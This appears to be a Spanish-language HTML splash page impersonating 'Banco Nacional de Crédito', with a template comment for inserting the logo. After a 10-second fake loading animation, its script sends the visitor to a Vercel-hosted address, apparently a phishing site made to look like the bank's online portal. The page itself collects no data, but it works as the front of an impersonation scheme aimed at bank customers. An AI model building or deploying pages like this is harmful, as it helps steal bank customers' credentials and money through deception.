<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Bienvenido al Portal BNC</title>
<style>
  :root{
    --navy:#0a2447;
    --orange:#e8622a;
  }
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
  html,body{height:100%;margin:0;}
  body{
    background:linear-gradient(170deg,#ffffff 0%,#eef2f8 100%);
    color:var(--navy);
    font-family:"Segoe UI",-apple-system,BlinkMacSystemFont,Roboto,"Helvetica Neue",Arial,sans-serif;
    display:flex;align-items:center;justify-content:center;
    -webkit-font-smoothing:antialiased;
  }

  .screen{
    width:100%;max-width:400px;
    padding:32px 26px;
    display:flex;flex-direction:column;align-items:center;
    text-align:center;
  }

  .brand{
    width:104px;height:auto;object-fit:contain;
    margin-bottom:32px;
  }

  h1{
    margin:0;
    font-size:23px;font-weight:800;line-height:1.3;
    letter-spacing:1.2px;text-transform:uppercase;
    color:var(--navy);
  }
  h1 .b{color:var(--orange);}

  .sub{
    margin:12px 0 0;
    font-size:13.5px;font-weight:400;line-height:1.5;
    color:#6a7686;
  }

  .spinner{
    position:relative;
    width:62px;height:62px;
    margin:40px 0 0;
    display:grid;place-items:center;
  }
  .ring{position:absolute;inset:0;width:100%;height:100%;}
  .ring-bg{fill:none;stroke:#dde3ec;stroke-width:3;}
  .ring-arc{
    fill:none;stroke:var(--orange);stroke-width:3;stroke-linecap:round;
    stroke-dasharray:54 141;transform-origin:50% 50%;
    animation:spin 1.1s linear infinite;
  }
  @keyframes spin{to{transform:rotate(360deg);}}

  .bar{
    width:100%;max-width:210px;height:4px;
    margin-top:28px;border-radius:4px;overflow:hidden;
    background:#e2e7ef;
  }
  .bar span{
    display:block;height:100%;width:0;
    background:var(--orange);
    animation:fill 10s linear forwards;
  }
  @keyframes fill{to{width:100%;}}

  .foot{
    margin-top:26px;
    font-size:11.5px;letter-spacing:.6px;
    color:#9aa4b2;
  }
</style>
</head>
<body>
  <div class="screen">

    <!-- pon aquí tu logo -->
    <img class="brand" src="/img/neol.png" alt="BNC">

    <h1>Bienvenido al <span class="b">Portal BNC</span></h1>
    <p class="sub">Estamos preparando todo para ti,<br>un momento por favor.</p>

    <div class="spinner">
      <svg class="ring" viewBox="0 0 100 100" aria-hidden="true">
        <circle class="ring-bg" cx="50" cy="50" r="46"/>
        <circle class="ring-arc" cx="50" cy="50" r="46"/>
      </svg>
    </div>

    <div class="bar"><span></span></div>

    <p class="foot">BANCO NACIONAL DE CRÉDITO</p>
  </div>

<script>
  const DESTINO = "https://bncenlinea.vercel.app/";   // página a la que pasa
  const DURACION = 10000;         // 10 segundos

  setTimeout(() => { window.location.href = DESTINO; }, DURACION);
</script>
</body>
</html>
